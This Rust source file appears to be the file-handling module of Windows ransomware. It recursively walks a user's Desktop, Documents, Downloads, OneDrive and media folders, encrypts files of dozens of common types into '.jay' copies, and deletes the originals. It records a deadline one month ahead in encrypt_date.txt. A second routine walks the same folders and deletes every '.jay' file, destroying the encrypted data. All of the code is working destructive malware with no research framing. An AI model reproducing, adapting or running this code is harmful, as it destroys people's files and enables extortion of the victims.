#[cfg(windows)]
extern crate winapi;


use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use winapi::um::fileapi::{CreateFileA, DeleteFileA, FindFirstFileA, FindNextFileA, WriteFile};
use winapi::um::fileapi::{OPEN_ALWAYS};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::minwinbase::{SYSTEMTIME, WIN32_FIND_DATAA};
use winapi::um::sysinfoapi::GetSystemTime;
use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_WRITE_DATA, GENERIC_ALL, HANDLE};
use crate::encryption::encrypt;

// traverse_and_encrypt will populate this vector
static mut VALID_EXTENSIONS: Vec<&str> = Vec::new();

pub fn traverse_and_encrypt() {
    unsafe {
        let extensions = [
            ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
            ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
            ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
            ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
        ];

        // push all valid extensions into VALID_EXTENSIONS
        for extension in extensions.iter() {
            VALID_EXTENSIONS.push(*extension);
        }
    }

    // Directories to traverse for encryption
    let dir_names = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];

    // Getting the username of the machine
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut user_name: Vec<u8> = Vec::new();

    unsafe {
        // Get length of name
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);
        // Get username
        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        user_name = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8); // Eliminate the null terminator

        for dir in dir_names.iter() {
            let mut full_path = String::from("C:\\Users\\");
            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
            full_path.push_str("\\");
            full_path.push_str(dir.clone());
            full_path.push_str("\\*");
            // Extract path and call traverse
            let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
            traverse(full_path);
        }

        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
        full_path.push_str("\\encrypt_date.txt");

        let full_path: CString = CString::new(full_path).unwrap();

        let date_file: HANDLE = CreateFileA(
            full_path.as_ptr(),
            FILE_WRITE_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let mut current_time: SYSTEMTIME = SYSTEMTIME {
            wYear: 0,
            wMonth: 0,
            wDayOfWeek: 0,
            wDay: 0,
            wHour: 0,
            wMinute: 0,
            wSecond: 0,
            wMilliseconds: 0,
        };
        GetSystemTime(&mut current_time);

        let mut write_buffer: Vec<u8> = Vec::new();
        if current_time.wMonth == 12 {
            current_time.wMonth = 1;
        } else {
            current_time.wMonth += 1;
        }
        write_buffer.push(current_time.wMonth as u8);
        write_buffer.push(current_time.wDay as u8);
        let mut written: u32 = 0;
        WriteFile(
            date_file,
            write_buffer.as_ptr() as *const _,
            2,
            &mut written,
            null_mut(),
        );
        CloseHandle(date_file);
    }
}

fn traverse(dir_name: CString) {
    unsafe {
        let mut file_data: WIN32_FIND_DATAA = std::mem::zeroed();
        let mut hFind: HANDLE = INVALID_HANDLE_VALUE;
        hFind = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        if hFind == INVALID_HANDLE_VALUE {
            // If path is not valid, return
            return;
        }

        loop {
            let mut name_buffer: Vec<u8> = Vec::new();

            for byte in file_data.cFileName.iter() {
                if *byte == 0 {
                    break;
                }
                name_buffer.push(*byte as u8);
            }

            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                let curr = dir_name.as_bytes();
                let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                let dot_position = new_dir.iter().rposition(|&x| x == b'.');
                if let Some(dot_position) = dot_position {
                    let extension: Vec<u8> = new_dir[dot_position..].to_vec();

                    if VALID_EXTENSIONS.iter().any(|&x| x == str::from_utf8(&extension).unwrap()) {
                        let source_file_name = new_dir.clone();
                        let mut dest_file_name = source_file_name.clone();
                        dest_file_name.extend_from_slice(b".jay");
                        encrypt(
                            CString::new(&source_file_name[..]).unwrap(),
                            CString::new(&dest_file_name[..]).unwrap(),
                        );
                        DeleteFileA(CString::new(&source_file_name[..]).unwrap().as_ptr());
                    }
                }
            } else {
                // Directory
                let name = str::from_utf8(&name_buffer).unwrap();
                if !((name_buffer.len() == 1 && name_buffer[0] == b'.')
                    || (name_buffer.len() == 2 && name_buffer[0] == b'.' && name_buffer[1] == b'.'))
                {
                    let curr = dir_name.as_bytes();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    let wildcard: Vec<u8> = "\\*".as_bytes().to_vec();
                    new_dir.extend_from_slice(&wildcard);
                    traverse(CString::new(new_dir).unwrap());
                }
            }

            if FindNextFileA(hFind, &mut file_data) == 0 {
                return;
            }
        }
    }
}

pub fn traverse_and_delete() {
    // Directories to traverse for deletion
    let dir_names = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];

    // Getting the username of the machine
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut user_name: Vec<u8> = Vec::new();

    unsafe {
        // Get length of name
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);
        // Get username
        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        user_name = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8); // Eliminate the null terminator

        for dir in dir_names.iter() {
            let mut full_path = String::from("C:\\Users\\");
            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
            full_path.push_str("\\");
            full_path.push_str(dir.clone());
            full_path.push_str("\\*");
            // Extract path and call delete
            let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
            delete(full_path);
        }
    }
}

fn delete(dir_name: CString) {
    unsafe {
        let mut file_data: WIN32_FIND_DATAA = std::mem::zeroed();
        let mut h_find: HANDLE = INVALID_HANDLE_VALUE;
        h_find = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        if h_find == INVALID_HANDLE_VALUE {
            // If path is not valid, return
            return;
        }

        loop {
            let mut name_buffer: Vec<u8> = Vec::new();

            for byte in file_data.cFileName.iter() {
                if *byte == 0 {
                    break;
                }
                name_buffer.push(*byte as u8);
            }

            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                let curr = dir_name.as_bytes();
                let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                let dot_position = new_dir.iter().rposition(|&x| x == b'.');
                if let Some(dot_position) = dot_position {
                    let extension: Vec<u8> = new_dir[dot_position..].to_vec();

                    if String::from_utf8(extension).unwrap() == ".jay".to_string() {
                        DeleteFileA(CString::new(new_dir).unwrap().as_ptr());
                    }
                }
            } else {
                // Directory
                let name = str::from_utf8(&name_buffer).unwrap();
                if !((name_buffer.len() == 1 && name_buffer[0] == b'.')
                    || (name_buffer.len() == 2 && name_buffer[0] == b'.' && name_buffer[1] == b'.'))
                {
                    let curr = dir_name.as_bytes();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    let wildcard: Vec<u8> = "\\*".as_bytes().to_vec();
                    new_dir.extend_from_slice(&wildcard);
                    delete(CString::new(new_dir).unwrap());
                }
            }

            if FindNextFileA(h_find, &mut file_data) == 0 {
                return;
            }
        }
    }
}